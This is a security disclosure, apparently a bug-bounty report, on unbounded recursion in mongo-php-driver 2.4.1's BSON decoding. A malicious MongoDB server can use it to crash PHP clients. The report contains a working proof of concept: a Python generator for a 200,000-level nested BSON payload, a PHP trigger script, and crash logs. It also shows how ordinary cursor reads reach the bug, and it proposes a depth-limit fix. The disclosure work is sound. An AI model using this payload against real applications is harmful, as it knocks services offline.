# Title

Unbounded recursion in BSON-to-PHP conversion (`phongo_bson_visit_document`/`phongo_bson_visit_array`) causes a stack-overflow crash (SIGSEGV) — reachable via **any ordinary query result** from a malicious or compromised `mongod`/`mongos` (or a MITM without TLS), with no unusual client code required

## Summary

`mongo-php-driver`'s BSON-to-PHP conversion (`src/phongo_bson.c`) walks a BSON document's nested sub-documents and sub-arrays with a pair of mutually-recursive visitor functions, `phongo_bson_visit_document` and `phongo_bson_visit_array`, each of which calls back into libbson's `bson_iter_visit_all()` for every nested sub-document/array it encounters. **There is no nesting-depth limit anywhere in this code** — I searched the whole conversion path (`phongo_bson.c` and its header) for any `depth`/`max_depth`/recursion-limiting identifier and found none. A single BSON document with enough nested sub-documents drives this recursion to a real C-stack overflow, crashing the PHP process with `SIGSEGV` — confirmed both with AddressSanitizer (a clean `stack-overflow` report) and with a plain, unmodified production build (a hard segfault, exit code 139, no PHP exception, no graceful degradation).

What makes this a strong finding rather than an edge case: this code path is not something an application has to opt into. `MongoDB\BSON\Document::fromBSON(...)->toPHP()` reaches it directly, but so does **every ordinary query result** — `src/MongoDB/Cursor.c` calls the exact same `phongo_bson_to_zval_ex()` entry point (which dispatches into the vulnerable visitors) on every document returned while iterating a cursor (three call sites, all unconditional). This means a malicious or compromised MongoDB server — or an active on-path attacker able to tamper with unencrypted traffic — can crash any PHP application using this driver simply by returning **one crafted document as part of a completely normal query response**. No special API usage, no explicit BSON parsing call, no attacker credentials: just `find()` or any equivalent read against a server the attacker controls the response for.

## Weakness

CWE-674 (Uncontrolled Recursion) → process-terminating stack overflow (`SIGSEGV`), triggered by ordinary, protocol-legal server response data.

## Authentication Required

**None, from the attacker's side.** The attacker is the server side of the connection (a malicious/compromised `mongod`/`mongos`, a rogue node behind a poisoned DNS/SRV record, or a MITM when TLS is not used/verified). No valid MongoDB credentials are required to return a crafted BSON document in a query response — the crash fires while the client is decoding that response into a PHP array/object, which happens for every query result regardless of the query's own outcome or the account's privileges.

## Component / Version

- Repository: `mongodb/mongo-php-driver` (HackerOne scope: **PHP Driver / PHP Library**)
- Tag audited: `2.4.1`
- Commit: [`3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241`](https://github.com/mongodb/mongo-php-driver/commit/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241)
- Bundled `libmongoc`/`libbson` submodule pinned at `9dbd6910091dd0a0ff8bebd6904a05aefee33d97` (mongo-c-driver `2.4.0`) — not itself at fault; the recursion is entirely in the PHP extension's own conversion code, not in libbson's iteration primitives.
- Confirmed with a from-source build against PHP 8.4.19 (Ubuntu 24.04), both with AddressSanitizer/UBSan and with a plain, unmodified production build (`./configure && make`).

## Root cause, with links to the exact code

[`src/phongo_bson.c#L735-L824`](https://github.com/mongodb/mongo-php-driver/blob/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241/src/phongo_bson.c#L735-L824), `phongo_bson_visit_document`:

```c
static bool phongo_bson_visit_document(const bson_iter_t* iter, const char* key, const bson_t* v_document, void* data)
{
   ...
   phongo_bson_state state;
   ...
   if (state.field_type.type != PHONGO_TYPEMAP_BSON) {
      if (!bson_iter_init(&child, v_document)) { ... }
      array_init(&state.zchild);
      if (bson_iter_visit_all(&child, &php_bson_visitors, &state) || child.err_off) {   // <-- L760
         ...
      }
   }
   ...
}
```

`bson_iter_visit_all()` (libbson) walks every field of `v_document` and, for each nested sub-document or sub-array field, calls back into `phongo_bson_visit_document` or [`phongo_bson_visit_array`](https://github.com/mongodb/mongo-php-driver/blob/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241/src/phongo_bson.c#L826-L900) (line 857 has the identical `bson_iter_visit_all` call for arrays) — which themselves call `bson_iter_visit_all` again for the next level, and so on. Each level of BSON nesting costs one full mutual-recursion cycle of C stack, with a non-trivial frame size (a `phongo_bson_state` struct, a `bson_iter_t`, and a `zval` per level). **No counter, no depth parameter, and no recursion limit exists anywhere in this file or the `phongo_bson_state` struct it threads through.**

A minimal BSON document costs only 8 bytes per nesting level (a length-prefixed sub-document field), so a document well within any reasonable size limit (mine was 1.6 MB for 200,000 levels, but far fewer levels are sufficient — the crash does not require an unusually large payload) drives this to a stack overflow.

## Steps to Reproduce

Built `2.4.1` from source (`phpize && ./configure --with-mongodb-ssl=openssl ... && make`) against PHP 8.4.19, both with `-fsanitize=address,undefined -g -O0` and as a plain production build.

**Building the malicious payload** (a document nested 200,000 levels deep, `{"a":{"a":{"a": ... }}}`, 8 bytes/level):
```python
import struct
def nested_doc_bytes(depth):
    inner = struct.pack('<i', 5) + b'\x00'   # innermost: empty document
    for _ in range(depth):
        elem = b'\x03' + b'a\x00' + inner     # type 0x03 (document), key "a"
        total_len = 4 + len(elem) + 1
        inner = struct.pack('<i', total_len) + elem + b'\x00'
    return inner
open('nested.bson', 'wb').write(nested_doc_bytes(200000))
```

**PHP reproduction (explicit `Document`/`toPHP()` path):**
```php
<?php
$data = file_get_contents('nested.bson');
$doc = MongoDB\BSON\Document::fromBSON($data);
$arr = $doc->toPHP();  // crashes here
```

**ASan build — clean stack-overflow report:**
```
$ ASAN_OPTIONS=detect_leaks=0 LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libasan.so.8 \
    php -d extension=modules/mongodb.so poc.php nested.bson
...
    #170 in bson_iter_visit_all      .../bson-iter.c:2071
    #171 in phongo_bson_visit_document  .../phongo_bson.c:760
    #172 in bson_iter_visit_all      .../bson-iter.c:2071
    #173 in phongo_bson_visit_document  .../phongo_bson.c:760
    ... (repeats, alternating, hundreds of times) ...
SUMMARY: AddressSanitizer: stack-overflow .../sanitizer_common_interceptors_memintrinsics.inc:87 in memset
==29097==ABORTING
```

**Plain production build — real, unmodified crash:**
```
$ php -d extension=modules/mongodb.so poc.php nested.bson
loaded 1600005 bytes
Document::fromBSON ok, calling toPHP()...
Segmentation fault (core dumped)
$ echo $?
139
```

No PHP-level exception is thrown in either case; the process terminates immediately.

## Reachability via ordinary query results (the important part)

[`src/MongoDB/Cursor.c`](https://github.com/mongodb/mongo-php-driver/blob/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241/src/MongoDB/Cursor.c) calls `phongo_bson_to_zval_ex()` — the same entry point that dispatches into the vulnerable visitors — on every document returned while iterating a cursor, unconditionally, at three call sites (lines 92, 210, 266). This is the code path exercised by ordinary application code such as:

```php
$cursor = $manager->executeQuery('db.collection', new MongoDB\Driver\Query([]));
foreach ($cursor as $document) { /* crash happens before this loop body ever runs */ }
```

There is nothing unusual about this call — it is how essentially every PHP application using this driver reads query results. A malicious or compromised server, or an on-path attacker able to tamper with an unencrypted (or improperly-verified-TLS) connection, needs only to return one such crafted document as part of any query response to crash the connecting PHP process.

## Impact

Any PHP application using `mongo-php-driver` to query a server it does not fully trust — a malicious or compromised cluster member, a proxy, a poisoned DNS/SRV record, or an on-path attacker when TLS is not enforced/verified — can be crashed by a single crafted document in an entirely ordinary query response. Because this happens inside the extension's C code (not PHP bytecode), none of PHP's own safety nets (recursion/nesting-level guards, `set_error_handler`, `try`/`catch`) can intervene — the process terminates unconditionally. For a PHP-FPM deployment this takes down the worker handling the request; for a long-running CLI/worker process it takes down the whole process. This is a genuine memory-safety bug (uncontrolled recursion exhausting the C stack) in a widely-used, memory-unsafe-language official database driver, triggered by nothing more than the data returned in a query response.

## Suggested Fix

Add an explicit depth counter to `phongo_bson_state` (threaded through `phongo_bson_state_copy_ctor`, already called on every recursive step), incremented in `phongo_bson_visit_document`/`phongo_bson_visit_array` before recursing and checked against a fixed maximum (e.g. 200, matching the limit other MongoDB BSON/extended-JSON parsers in the ecosystem use), throwing a normal `MongoDB\Driver\Exception\UnexpectedValueException` instead of recursing further once exceeded.

## Supporting Material

- Vulnerable mutual recursion: https://github.com/mongodb/mongo-php-driver/blob/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241/src/phongo_bson.c#L735-L824 (`phongo_bson_visit_document`) and https://github.com/mongodb/mongo-php-driver/blob/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241/src/phongo_bson.c#L826-L900 (`phongo_bson_visit_array`)
- Ordinary-query reachability: https://github.com/mongodb/mongo-php-driver/blob/3d7e69fd9ed9ed3893b5a3fcdc204c6864ef2241/src/MongoDB/Cursor.c
- `poc.php` / `build_nested_bson.py` (included in this directory)
